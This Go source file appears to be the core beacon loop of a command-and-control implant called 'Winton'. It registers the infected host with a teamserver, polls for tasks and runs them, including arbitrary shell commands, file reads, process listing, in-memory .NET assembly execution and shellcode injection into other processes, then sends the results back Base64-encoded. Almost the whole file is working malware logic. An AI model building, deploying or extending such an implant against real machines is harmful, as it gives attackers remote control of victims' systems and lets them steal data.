package cmd

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"strconv"
	"strings"
	"time"

	"Winton/cmd/beacon"
	"Winton/cmd/commands"
	"Winton/cmd/utils"
)

var (
	Listener      string
	Port          string
	URL           string
	RegisterAgent string
	GetTask       string
	PostResult    string
)

func init() {
	Listener = "http://127.0.0.1"
	Port = "80"

	URL = Listener + ":" + Port
	RegisterAgent = URL + "/register"
	GetTask = URL + "/tasks"
	PostResult = URL + "/results"

	fmt.Printf("[DEBUG] Listener: %s:%s\n", Listener, Port)
}

func Run() error {
	user, err := user.Current()
	if err != nil {
		fmt.Println(err)
	}

	ip, err := utils.GetInternalIP()
	if err != nil {
		fmt.Println(err)
	}

	OSArch := utils.GetSystemInfo()
	PID := strconv.Itoa(os.Getpid())

	agent := beacon.Agent{
		IP:       ip,
		ExtIP:    "", // TODO
		Hostname: user.Username,
		Sleep:    "5", // default sleep
		Jitter:   "0", // default jitter
		OS:       OSArch,
		UID:      "",
		PID:      PID,
	}

	fmt.Printf("[*] Registering agent, via %s to %s\n", agent.IP, RegisterAgent)

	res, err := beacon.Register(agent, RegisterAgent)
	if err != nil {
		fmt.Println(err)
		return err // kill if this hits
	}

	var json_data map[string]interface{}
	err = json.Unmarshal(res, &json_data)
	if err != nil {
		fmt.Println(err)
		return err // kill if this hits
	}

	agent.UID = json_data["uid"].(string)
	fmt.Printf("[*] Agent registered successfully, assigned UID [%s] with Sleep [%s]\n", agent.UID, agent.Sleep)

	for {
		ok := false
		fmt.Println("[*] Sleeping...")
		time.Sleep(5 * time.Second)

		fmt.Println("[*] Checking for tasks")
		res, err := beacon.Recv(agent, GetTask)
		if err != nil {
			fmt.Println("[!] Error getting tasks, going back to sleep...")
			fmt.Println(err)
			break
		}

		var json_data map[string]interface{}
		err = json.Unmarshal(res, &json_data)
		if err != nil {
			fmt.Println(err)
			break
		}

		if json_data["message"] == "No tasks found" {
			fmt.Println("[*] No tasks found, going back to sleep...")
			continue
		}

		tasks := json_data["tasks"].([]interface{})
		task := tasks[0].(map[string]interface{})
		command := task["Command"].(string)

		temp := strings.Split(command, " ")
		command_args := []string{""}

		if len(temp) > 1 {
			command_args = temp[1:]
			command = temp[0]
		}

		switch command {
		case "ls":
			fmt.Println("[*] Found 'ls', executing command")
			cwd, err := os.Getwd()
			if err != nil {
				fmt.Println("[!] Error getting current working directory")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Current working directory: " + cwd)

			files, err := commands.Ls(cwd)
			if err != nil {
				fmt.Println("[!] Error listing files")
				fmt.Println(err)
				break
			}

			jsonFiles, err := json.Marshal(files)
			if err != nil {
				fmt.Println("[!] Error marshalling files")
				fmt.Println(err)
				break
			}

			command_id := task["CommandID"].(string)
			result := utils.Base64_Encode((jsonFiles))

			result_struct := beacon.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Sending results to teamserver...")

			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Results sent successfully")
			ok = true

		case "whoami":
			fmt.Println("[*] Found 'whoami', executing command")

			command_id := task["CommandID"].(string)
			result := utils.Base64_Encode([]byte(commands.Whoami()))

			result_struct := beacon.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))
			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Results sent successfully")
			ok = true

		case "pwd":
			fmt.Println("[*] Found 'pwd', executing command")
			command_id := task["CommandID"].(string)
			result := utils.Base64_Encode([]byte(commands.Pwd()))

			result_struct := beacon.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Results sent successfully")
			ok = true

		case "cat":
			fmt.Println("[*] Found 'cat', executing command")
			fmt.Println("[*] Cat Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			result, err := commands.Cat(strings.Join(command_args, " "))
			if err != nil {
				fmt.Println("[!] Error executing cat command")
				fmt.Println(err)
				break
			}

			result = utils.Base64_Encode([]byte(result))

			result_struct := beacon.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Results sent successfully")
			ok = true

		case "shell":
			fmt.Println("[*] Found 'shell', executing command")
			fmt.Println("[*] Shell Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			shell_res, err := commands.Shell(strings.Join(command_args, " "))
			if err != nil {
				fmt.Println("[!] There was an error executing the shell command, could be AV or syntax error")
				fmt.Println("[!] Regardless, don't kill just yet.")
			}

			result := utils.Base64_Encode([]byte(shell_res))

			result_struct := beacon.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Results sent successfully")
			ok = true

		case "ps":
			fmt.Println("[*] Found 'ps', executing command")
			command_id := task["CommandID"].(string)
			ps_res, err := commands.Ps()
			if err != nil {
				fmt.Println("[!] Error executing ps command")
				fmt.Println(err)
				break
			}

			result := utils.Base64_Encode([]byte(ps_res))

			result_struct := beacon.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Results sent successfully")
			ok = true

		case "getpid":
			fmt.Println("[*] Found 'getpid', executing command")
			command_id := task["CommandID"].(string)
			pid_res := commands.Get_pid()

			result := utils.Base64_Encode([]byte(pid_res))

			result_struct := beacon.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Results sent successfully")
			ok = true

		case "execute-assembly":
			fmt.Println("[!] Found 'execute-assembly', executing .NET assembly in memory now...")
			fmt.Println("[!] Execute-Assembly Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			raw_bytes, err := utils.Base64_Decode(command_args[0])
			if err != nil {
				fmt.Println("[!] Error decoding base64 encoded assembly")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Assembly length:", len(raw_bytes))

			args := []string{}
			if len(command_args) > 1 {
				args = command_args[1:]
			}
			fmt.Println("[*] Assembly args: ", args)

			res, err := commands.Execute_Assembly(raw_bytes, args)
			if err != nil {
				fmt.Println("[!] Error executing assembly")
				fmt.Println(err)
				break
			}

			result := utils.Base64_Encode([]byte(res))

			result_struct := beacon.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Results sent successfully")
			ok = true

		case "inject":
			fmt.Println("[*] Found 'inject', executing command")
			fmt.Println("[*] Inject Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			PID := command_args[0]
			PIDInt, err := strconv.Atoi(PID)
			if err != nil {
				fmt.Println("[!] Error converting PID to integer")
				fmt.Println(err)
				break
			}

			shellcode, err := utils.Base64_Decode(command_args[1])
			if err != nil {
				fmt.Println("[!] Error converting PID to integer")
				fmt.Println(err)
				break
			}

			inject_res, err := commands.Inject(PIDInt, shellcode)
			if err != nil {
				fmt.Println("[!] Error injecting shellcode")
				fmt.Println(err)
				break
			}

			var result string
			if inject_res == "OK" {
				result = utils.Base64_Encode([]byte("Shellcode injected successfully"))
			} else {
				result = utils.Base64_Encode([]byte("Error injecting shellcode"))
			}

			result_struct := beacon.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Sending results to teamserver...")

			_, err = beacon.Send(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				break
			}

			fmt.Println("[*] Results sent successfully")
			ok = true

		default:
			fmt.Println("[!] Command not found")
		}

		fmt.Println("[*] Checking if task successfully completed...")
		if ok {
			fmt.Println("[*] Task successfully completed, should be automatically removed from queue")
		} else {
			fmt.Println("[!] Task failed, let's tell winton that we failed :(")
			result_struct := beacon.TaskResult{
				CommandID: task["CommandID"].(string),
				Result:    utils.Base64_Encode([]byte("[!] Something went wrong running that command, you should probably check the agent [!]")),
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err // now if this fails, the agent should probably die
			}

			_, err = beacon.Send(agent, PostResult, jsonResult, task["CommandID"].(string))
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err // this too
			}

			fmt.Println("[*] Results sent successfully")

		}
	}
	return nil
}
